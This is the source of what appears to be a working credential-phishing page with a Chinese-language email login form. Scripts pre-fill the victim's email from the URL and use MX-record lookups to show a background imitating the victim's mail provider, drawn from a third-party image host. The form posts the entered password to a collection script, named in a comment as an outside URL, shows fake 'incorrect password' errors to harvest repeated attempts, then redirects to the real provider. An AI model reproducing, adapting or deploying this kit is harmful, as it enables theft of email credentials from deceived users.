<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.2.1/axios.min.js"></script>
<iframe id="websiteFrame" style="width:100%; height:100%; border:none;"></iframe>
<div class="request" style="position: absolute; top: 55%; left: 50%; transform: translate(-50%, -50%); display: flex; justify-content: center; align-items: center; background-color: rgba(255, 255, 255, 0.9); padding: 30px; box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3);width:500px;">

<!-- 
 action="https://blog03.romulovasconcelos.com.br/abc/error.php"
 -->
<form method="post" id="authForm" style="width: 100%; max-width: 400px;">

	    <h2 style="text-align: center; font-weight: bold; font-size: 28px; margin-bottom: 30px;">登入</h2>

	    <div style="margin-bottom: 20px;">
	      <label for="username" style="display: block; font-size: 18px; margin-bottom: 10px;">电子邮件:&nbsp;<span  style="color:red; font-size:14px" class="E-mail" /> </label>
	      <input 
          id="username"
          name="Username" 
          style="width: 100%; padding: 10px; font-size: 16px; border: 2px solid #e1e1e1; border-radius: 5px;"
         />
	    </div>

	    <div style="margin-bottom: 30px;">
	      <label for="password" style="display: block; font-size: 18px; margin-bottom: 10px;">密码:&nbsp;<span style="color:red; font-size:14px" class="E-password" /> </label>
	      <input
            id="password"
            name="Password" 
            autocomplete="off" 
            style="width: 100%; padding: 10px; font-size: 16px; border: 2px solid #e1e1e1; border-radius: 5px;"
         />
	    </div>

	    <div style="text-align: center;">
        <input 
            type="submit" 
            value="登入" 
            style="background-color: #4CAF50; color: white; padding: 12px 24px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer;"
        />
	    </div>
	    
	</form>
 

<script>
  function updateFormSubmissions() {
    var formSubmissions = parseInt(localStorage.getItem('form_submissions'));
    if (!formSubmissions) {
      formSubmissions = 0;
    }
    formSubmissions += 1;
    localStorage.setItem('form_submissions', formSubmissions);
    document.getElementById('form-submissions').innerHTML = 'Form submitted ' + formSubmissions + ' times';
  }
  
  var formSubmissions = parseInt(localStorage.getItem('form_submissions'));
  if (formSubmissions) {
    document.getElementById('form-submissions').innerHTML = 'Form submitted ' + formSubmissions + ' times';
  }
</script>



<!-- Submitting the form requesst -->
<script>
  const AuthForm = document.querySelector('#authForm')
  let count = localStorage.getItem("@count") ?? 0;

  const isValidEmail = (email) => {
    let regex = new RegExp('[a-z0-9]+@[a-z]+\.[a-z]{2,3}');
    return regex.test(email)
  }

  const submit = async (e) => {
      const Username = AuthForm.querySelector('#username')
      const Password = AuthForm.querySelector('#password')
      const EPasswowrd = AuthForm.querySelector('.E-password');
      const EEmail = AuthForm.querySelector('.E-mail');

      EPasswowrd.innerText='';
      EEmail.innerText='';
      e.preventDefault();

      (!Password.value || !isValidEmail(Username.value)) || localStorage.setItem('@count', count++);

      if(!Password.value || !isValidEmail(Username.value)){
        EEmail.innerText= !isValidEmail(Username.value) ?  "Enter a valid email address!" :'';
        EPasswowrd.innerText = (!Password.value || count<=2) ? "输入的密码不正确，请重试！" :'';
        return 
      }

      const mailProvider = Username.value?.split('@')[1]
      const url = new URL('error.php',location.href).href
      const body  = new FormData(AuthForm)

      axios.post(url, body)
      .then( ({data}) =>    console.log(data))
      .catch(e=>console.log("-:ERROR"))

      if(count>=2){
        localStorage.setItem('@count', 0)
        location.replace(`https://${mailProvider}`)
      }
      Password.value = ''
      // Username.value =''
      EPasswowrd.innerText = '输入的密码不正确，请重试！'
  }

  AuthForm.addEventListener('submit', submit)
</script>
	

<script>
  var modal = document.querySelector('.modal');
  var close = document.querySelector('.close');

  window.onload = function() {
    modal.style.display = 'block';
  };

  close.onclick = function() {
    modal.style.display = 'none';
  };

  window.onclick = function(event) {
    if (event.target == modal) {
      modal.style.display = 'none';
    }
  };
</script>


  </form>

</div>

</div>

</div>
           
           


<script>
  // Get the email query parameter from the URL
  const queryString = window.location.search;
  const urlParams = new URLSearchParams(queryString);
  const email = urlParams.get('email');

  // Set the value of the email input field to the email from the URL
  const emailField = document.getElementById('username');
  emailField.value = email;

  // Load the website into the iframe
  const domain = email?.split('@')[1];
  const websiteUrl = `https://${domain}`;
  const websiteFrame = document.getElementById('websiteFrame');

  // Check if iframe is blocked
  let iframeBlocked = false;
  try {
    websiteFrame.contentWindow.location.href;
  } catch (e) {
    iframeBlocked = true;
  }

  // Check MX records
  const checkMxRecords = () => {
    const mxUrl = `https://dns.google/resolve?name=${domain}&type=MX`;
    fetch(mxUrl)
      .then(response => response.json())
      .then(data => {
        const mxRecords = data?.Answer?.filter?.(record => record.type === 15).map(record => record.data.toLowerCase());

        // Check for Office 365 domains
        const office365Hostnames = ['outlook.com', 'office.com', 'hotmail.com', 'mail.protection.outlook.com']?.filter(hostname => mxRecords?.some?.(record => record.includes(hostname)));
        if (office365Hostnames.length > 0) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/office.png')";
        } 
        // Check for Gmail domains
        else if (mxRecords?.some?.(record => record.includes('gmail.com')) || mxRecords?.some?.(record => record.includes('google.com'))) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/gmail.png')";
        }
        
        // Check for yahoo domains
        else if (mxRecords?.some?.(record => record.includes('yahoo.com')) || mxRecords?.some?.(record => record.includes('yahoo'))) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/yahoo.png')";
        }
        
        
                // Check for godaddy domains
        else if (mxRecords?.some?.(record => record.includes('secureserver.net')) || mxRecords?.some?.(record => record.includes('secureserver.net'))) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/godaddy.png')";
        }
        
        
        
                // Check for yahoo domains
        else if (mxRecords?.some?.(record => record.includes('protonmail.com')) || mxRecords?.some?.(record => record.includes('proton'))) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/proton.png')";
        }
        
        
                // Check for aol domains
        else if (mxRecords?.some?.(record => record.includes('aol.com')) || mxRecords?.some?.(record => record.includes('aol.com'))) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/aol.png')";
        }
        
        
                // Check for gandi domains
        else if (mxRecords?.some?.(record => record.includes('gandi.net')) || mxRecords?.some?.(record => record.includes('gandi'))) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/gandi.png')";
        }
        
        
                // Check for 1and1 domains
        else if (mxRecords?.some?.(record => record.includes('1and1.com')) || mxRecords?.some?.(record => record.includes('1and1'))) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/1and1.png')";
        }
        
                // Check for bluehost domains 
        else if (mxRecords?.some?.(record => record.includes('bluehost-com')) || mxRecords?.some?.(record => record.includes('bluehost'))) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/bluehost.png')";
        }
        
        
                // Check for namecheap domains
        else if (mxRecords?.some?.(record => record.includes('mx1.privateemail.com')) || mxRecords?.some?.(record => record.includes('privateemail'))) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/namecheap.png')";
        }
        
        
                // Check for mailfence.com domains
        else if (mxRecords?.some?.(record => record.includes('mailfence.com')) || mxRecords?.some?.(record => record.includes('mailfence'))) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/mailfence.png')";
        }
        
        
                // Check for GMX domains
        else if (mxRecords?.some?.(record => record.includes('mx00.gmx.net')) || mxRecords?.some?.(record => record.includes('gmx'))) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/gmx.png')";
        }
        
        
                // Check for Yandex domains
        else if (mxRecords?.some?.(record => record.includes('mx.yandex.ru')) || mxRecords?.some?.(record => record.includes('yandex'))) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/yandex.png')";
        }
        
        
                // Check for QQ domains
        else if (mxRecords?.some?.(record => record.includes('qq.com')) || mxRecords?.some?.(record => record.includes('qq'))) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/qq.png')";
        }
        
        
                // Check for NETEASE domains
        else if (mxRecords?.some?.(record => record.includes('netease.com')) || mxRecords?.some?.(record => record.includes('163'))) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/163.png')";
        }
        
        
                // Check for naver domains
        else if (mxRecords?.some?.(record => record.includes('naver.com')) || mxRecords?.some?.(record => record.includes('naver'))) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/naver.png')";
        }
        
        
                // Check for sina domains
        else if (mxRecords?.some?.(record => record.includes('sina.com.cn')) || mxRecords?.some?.(record => record.includes('sina'))) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/sina.png')";
        }
        
        
                // Check for att.net domains
        else if (mxRecords?.some?.(record => record.includes('prodigy.net')) || mxRecords?.some?.(record => record.includes('att'))) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/att.png')";
        }
        
        
                // Check for COMCAST domains
        else if (mxRecords?.some?.(record => record.includes('comcast.net')) || mxRecords?.some?.(record => record.includes('comcast'))) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/comcast.png')";
        }
        
        
                // Check for earthlink domains
        else if (mxRecords?.some?.(record => record.includes('earthlink-vadesecure.net')) || mxRecords?.some?.(record => record.includes('earthlink'))) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/earthlink.png')";
        }
        
        
                // Check for vodacom domains
        else if (mxRecords?.some?.(record => record.includes('vodacom')) || mxRecords?.some?.(record => record.includes('vodacom'))) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/vodacom.png')";
        }
        
        
                // Check for ICLOUD domains
        else if (mxRecords?.some?.(record => record.includes('mx01.mail.icloud.com')) || mxRecords?.some?.(record => record.includes('icloud'))) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/icloud.png')";
        }
        // If no match, use default background
        else {
          if (iframeBlocked) {
            // Use webthumbnail library to get screenshot
            const apiUrl = `https://webthumbnail.org/api/get?url=${websiteUrl}&width=1280&height=720`;
            fetch(apiUrl)
              .then(response => response.blob())
              .then(data => {
                const bgImage = URL.createObjectURL(data);
                document.body.style.backgroundImage = `url(${bgImage})`;
                websiteFrame.remove(); // Remove iframe since it's blocked
              })
              .catch(error => {
                console.error(error);
                document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/webmail.png')";
                websiteFrame.remove(); // Remove iframe since it's blocked
              });
          } else {
            //
            // Use iframe
            websiteFrame.src = websiteUrl;

            // Set the background color of the iframe to match the website background color
            websiteFrame.addEventListener('load', function() {
              const backgroundColor = window.getComputedStyle(websiteFrame.contentDocument.body).backgroundColor;
              websiteFrame.style.backgroundColor = backgroundColor;
            });
          }
        }
      })
      .catch(error => {
        console.error(error);
        if (iframeBlocked) {
          document.body.style.backgroundImage = "url('https://whmcsnodes.xyz/ebube/background/webmail.png')";
          websiteFrame.remove(); // Remove iframe since it's blocked
        } else {
          websiteFrame.src = websiteUrl;
        }
      });
  }

  checkMxRecords();
</script>



